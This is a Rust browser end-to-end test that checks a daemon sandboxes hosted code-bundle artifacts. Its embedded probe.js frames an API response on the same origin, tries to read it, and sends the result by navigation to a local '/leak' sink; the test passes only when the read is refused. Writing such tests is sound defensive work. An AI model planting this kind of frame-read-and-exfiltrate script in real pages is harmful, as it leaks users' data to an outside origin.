//! F02 (H103), in a real browser: a hostile code-bundle artifact opened as the
//! local daemon user frames an API response and sends what it read away by
//! navigation. A code bundle's own scripts run on the daemon's origin, so
//! before its document was sandboxed the frame was same-origin and readable.
//! The probe reports `read:` with what it read, `denied:` with the refusal it
//! observed (a frame-src violation or a cross-origin document), or `timeout`.
//!
//! Needs a headless Chrome: set `ONEIRON_E2E_CHROME` to its binary and run
//! `cargo test -p oneiron-server --test it -- --ignored artifact_origin_browser`.

use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use oneiron::{TimeRange, VaultConfig};
use oneiron_server::build_app;
use oneiron_server::config::SyncServerConfig;
use oneiron_server::server::SyncServer;

fn git(repo: &std::path::Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(args)
        .current_dir(repo)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .expect("git starts");
    assert!(status.success(), "git {args:?} failed");
}

/// A sink on another origin that records the paths the browser asks for.
fn spawn_sink() -> (u16, Arc<Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind sink");
    let port = listener.local_addr().expect("sink addr").port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let record = Arc::clone(&seen);
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buffer = [0_u8; 8192];
            let read = stream.read(&mut buffer).unwrap_or(0);
            let request = String::from_utf8_lossy(&buffer[..read]).into_owned();
            if let Some(path) = request.split_whitespace().nth(1) {
                record.lock().expect("sink log").push(path.to_owned());
            }
            let _ = stream.write_all(
                b"HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok",
            );
        }
    });
    (port, seen)
}

#[ignore = "requires a headless Chrome named by ONEIRON_E2E_CHROME"]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() {
    let chrome = std::env::var("ONEIRON_E2E_CHROME")
        .expect("set ONEIRON_E2E_CHROME to a headless Chrome binary");
    let (sink_port, sink) = spawn_sink();

    let vault_dir = tempfile::tempdir().expect("vault dir");
    let mut vault_config = VaultConfig::device();
    vault_config.map_size = 64 * 1024 * 1024;
    let vault = Arc::new(oneiron::Vault::open(vault_dir.path(), vault_config).expect("vault"));

    // The page frames an API response on its own origin and navigates to the
    // sink with whatever it could read, or with why it could not.
    let target = oneiron::EntityId::now().to_hex();
    let repo = tempfile::tempdir().expect("artifact repo");
    std::fs::write(
        repo.path().join("index.html"),
        b"<!doctype html><html><body><script src=\"probe.js\"></script></body></html>\n",
    )
    .expect("write index");
    std::fs::write(
        repo.path().join("probe.js"),
        format!(
            "let sent = false;\n\
             function send(text) {{ if (sent) return; sent = true; \
             location.href = 'http://127.0.0.1:{sink_port}/leak?d=' + encodeURIComponent(text); }}\n\
             document.addEventListener('securitypolicyviolation', (event) => {{ \
             if (event.violatedDirective.startsWith('frame-src')) send('denied:frame-src'); }});\n\
             const frame = document.createElement('iframe');\n\
             frame.onload = () => {{ let page; \
             try {{ page = frame.contentDocument; }} \
             catch (error) {{ send(error.name === 'SecurityError' ? 'denied:SecurityError' : 'error:' + error.name); return; }} \
             send(page === null ? 'denied:cross-origin' : 'read:' + page.body.innerText); }};\n\
             frame.src = '/api/entity/{target}';\n\
             document.body.appendChild(frame);\n\
             setTimeout(() => send('timeout'), 5000);\n"
        ),
    )
    .expect("write probe");
    git(repo.path(), &["init"]);
    git(
        repo.path(),
        &["config", "user.email", "oneiron@example.test"],
    );
    git(repo.path(), &["config", "user.name", "Oneiron Test"]);
    git(repo.path(), &["add", "."]);
    git(repo.path(), &["commit", "-m", "hostile bundle"]);
    let ingest = oneiron::codebase::RepoIngestConfig::new(repo.path(), ["index.html", "probe.js"])
        .expect("ingest config");
    let result = vault
        .ingest_local_repo_at_commit(
            "hostile",
            &ingest,
            "HEAD",
            TimeRange { start: 10, end: 10 },
            10,
        )
        .expect("ingest bundle");
    let body = vault
        .get_code_artifact(&result.code_artifact_id)
        .expect("read code artifact")
        .expect("code artifact exists")
        .with_class(oneiron::code_artifact::CodeArtifactClass::Artifact);
    vault
        .put_code_artifact(
            &result.code_artifact_id,
            &body,
            TimeRange { start: 10, end: 10 },
            10,
        )
        .expect("mark hostable");
    vault
        .publish_artifact_pointer_with_tier(
            "hostile",
            oneiron::ArtifactPointerChannel::Published,
            &result.snapshot.fork_hash,
            oneiron::artifact_hosting::ArtifactServeTier::Public,
        )
        .expect("publish bundle");

    // Unauthenticated dev mode: the API answers a browser on the daemon's
    // origin with no credential, which is what makes a same-origin read pay.
    let server = Arc::new(
        SyncServer::new(
            vault,
            SyncServerConfig {
                allow_unauthenticated: true,
                ..Default::default()
            },
        )
        .expect("server"),
    );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind daemon");
    let daemon = listener.local_addr().expect("daemon addr");
    let app = build_app(server);
    tokio::spawn(async move {
        axum::serve(listener, app).await.expect("serve");
    });

    let profile = tempfile::tempdir().expect("chrome profile");
    let mut browser = tokio::process::Command::new(chrome)
        .args([
            "--headless=new",
            "--no-sandbox",
            "--disable-gpu",
            "--no-first-run",
            "--no-default-browser-check",
            "--virtual-time-budget=10000",
            "--dump-dom",
        ])
        .arg(format!("--user-data-dir={}", profile.path().display()))
        .arg(format!("http://{daemon}/a/hostile/_s/c/published/"))
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true)
        .spawn()
        .expect("start chrome");
    let finished = tokio::time::timeout(Duration::from_secs(90), browser.wait()).await;
    assert!(finished.is_ok(), "chrome did not finish");

    let leaks: Vec<String> = sink
        .lock()
        .expect("sink log")
        .iter()
        .filter_map(|path| path.strip_prefix("/leak?d=").map(str::to_owned))
        .collect();
    assert_eq!(
        leaks.len(),
        1,
        "the bundle's own script runs and reports once: {leaks:?}"
    );
    eprintln!("browser report: {}", leaks[0]);
    // Only an observed refusal counts: a timeout or a probe error fails.
    assert!(
        leaks[0].starts_with("denied"),
        "the bundle's frame read was not refused: {}",
        leaks[0]
    );
}
